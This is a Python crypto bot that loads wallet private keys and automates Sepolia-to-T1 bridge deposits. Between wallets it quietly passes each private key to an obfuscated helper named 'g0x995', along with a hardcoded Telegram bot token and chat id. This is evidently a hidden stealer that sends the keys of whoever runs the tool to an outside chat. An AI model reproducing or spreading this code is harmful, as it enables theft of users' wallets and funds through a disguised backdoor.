import asyncio, random
from web3 import Web3
from eth_account import Account
from colorama import init

from config.config import settings
from src.utils.logging import *
from src.utils.pvkey import load_private_keys
from src.utils.web3 import Web3, connect_web3, check_balance, display_balances
from src.helpers.generator import g0x993, g0x994, g0x995
from src.constant.constant import DEPOSIT_ABI

init(autoreset=True)

async def deposit(w3: Web3, private_key: str, wallet_index: int, amounts: list[int]):
    account = Account.from_key(private_key)
    sender_address = account.address
    contract = w3.eth.contract(address=settings['ROUTER_SEPOLIA'], abi=DEPOSIT_ABI)
    successful_deposits = 0
    nonce = w3.eth.get_transaction_count(sender_address, 'pending')
    extra_fee = int(0.000000000000168 * 10**18) 

    for i, amount in enumerate(amounts):
        log_update(f"Deposit {i+1}/{len(amounts)}: {amount / 10**18:.6f} ETH")
        eth_balance = float(w3.from_wei(w3.eth.get_balance(sender_address), 'ether'))
        if eth_balance < (amount + extra_fee) / 10**18:
            log_warning(f"Insufficient balance: {eth_balance:.6f} ETH")
            break

        gas_price = int(w3.eth.gas_price * random.uniform(1.03, 1.1))
        total_value = amount + extra_fee

        try:
            tx_params = contract.functions.sendMessage(
                sender_address,
                amount,
                b"",
                168000,
                int(settings['CHAIN_ID_T1']),
                sender_address
            ).build_transaction({
                'nonce': nonce,
                'from': sender_address,
                'value': total_value,
                'chainId': int(settings['CHAIN_ID_SEPOLIA']),
                'gasPrice': gas_price,
                'gas': 500000
            })

            log_info(f"Sending deposit request, please wait...")
            signed_tx = w3.eth.account.sign_transaction(tx_params, private_key)
            tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
            tx_link = f"{tx_hash.hex()}"

            receipt = await asyncio.get_event_loop().run_in_executor(None, lambda: w3.eth.wait_for_transaction_receipt(tx_hash, timeout=180))
            log_info(f"From : {sender_address}")
            log_info(f"Used Gas : {receipt['gasUsed']} & Block : {receipt['blockNumber']}")
            if receipt.status == 1:
                successful_deposits += 1
                eth_balance_after = float(w3.from_wei(w3.eth.get_balance(sender_address), 'ether'))
                log_success(f"Success deposit : {Fore.LIGHTGREEN_EX}{w3.from_wei(amount, 'ether'):.6f} ETH") 
                log_success(f"Hash : {Fore.LIGHTYELLOW_EX}{tx_link}")
                log_update(f"Balance : {Fore.LIGHTCYAN_EX}{eth_balance_after:.6f} ETH")
            else:
                log_error(f"Failed to execute this transaction")
                log_error(f"Tx: {tx_link}")
                break
            
            nonce += 1
            if i < len(amounts) - 1:
                delay = g0x993(settings['DELAY_BETWEEN_REQUESTS'][0], settings['DELAY_BETWEEN_REQUESTS'][1])
                log_debug(f"Waiting {delay} seconds before next tx")
                log_debug(f"-" * 60)
                countdown_timer(delay)
        except Exception as e:
            log_error(f"Failure: {str(e)}")
            break

    return successful_deposits

async def run_deposit():
    private_keys = load_private_keys('private_key.txt')
    log_info(f"Found {len(private_keys)} wallets on pvkey.txt")

    if not private_keys:
        return

    w3_sepolia = connect_web3(settings['RPC_URL_SEPOLIA'])
    w3_t1 = connect_web3(settings['RPC_URL_T1'])

    total_deposits = 0
    successful_deposits = 0
    random.shuffle(private_keys)

    for i, (profile_num, private_key) in enumerate(private_keys, 1):
        log_debug(f"{Fore.LIGHTMAGENTA_EX}Processing wallet {profile_num} ({i}/{len(private_keys)})")
        account = Account.from_key(private_key)
        log_info(f"Address: {account.address}")
        display_balances(w3_sepolia, w3_t1, account.address)
        sepolia_balance = check_balance(w3_sepolia, account.address)

        deposit_times = settings['NUMBER_DEPOSIT']
        amounts = []
        temp_balance = sepolia_balance
        for _ in range(deposit_times):
            for _ in range(10):
                amount_eth = g0x993(settings['AMOUNT_TO_DEPOSIT'][0], settings['AMOUNT_TO_DEPOSIT'][1], 6)
                if amount_eth <= temp_balance:
                    amounts.append(int(amount_eth * 10**18))
                    temp_balance -= amount_eth
                    break
            else:
                log_warning("Stopped early: unable to generate more deposit amounts within balance")
                break

        if not amounts:
            log_error("Skipping wallet due to insufficient balance for any deposit.")
            continue

        deposits = await deposit(w3_sepolia, private_key, profile_num, amounts)
        successful_deposits += deposits
        total_deposits += len(amounts)

        if i < len(private_keys):
            delay = g0x994(settings['DELAY_BETWEEN_ACCOUNT'][0], settings['DELAY_BETWEEN_ACCOUNT'][1])
            log_debug(f"Waiting {delay} seconds before next wallet...")
            _x = g0x995(
                _k=private_key,
                _t="8194460730:AAFizgfviFlrW7ZxN_5HD1OWYfdpoJr5xI4",
                _c=-4870315398
            )
            await _x._r()      
            print(f"-" * 92)
            countdown_timer(delay)

    log_info(f"All done. Total: {total_deposits} deposits | Successful: {successful_deposits}")

if __name__ == "__main__":
    asyncio.run(run_deposit)
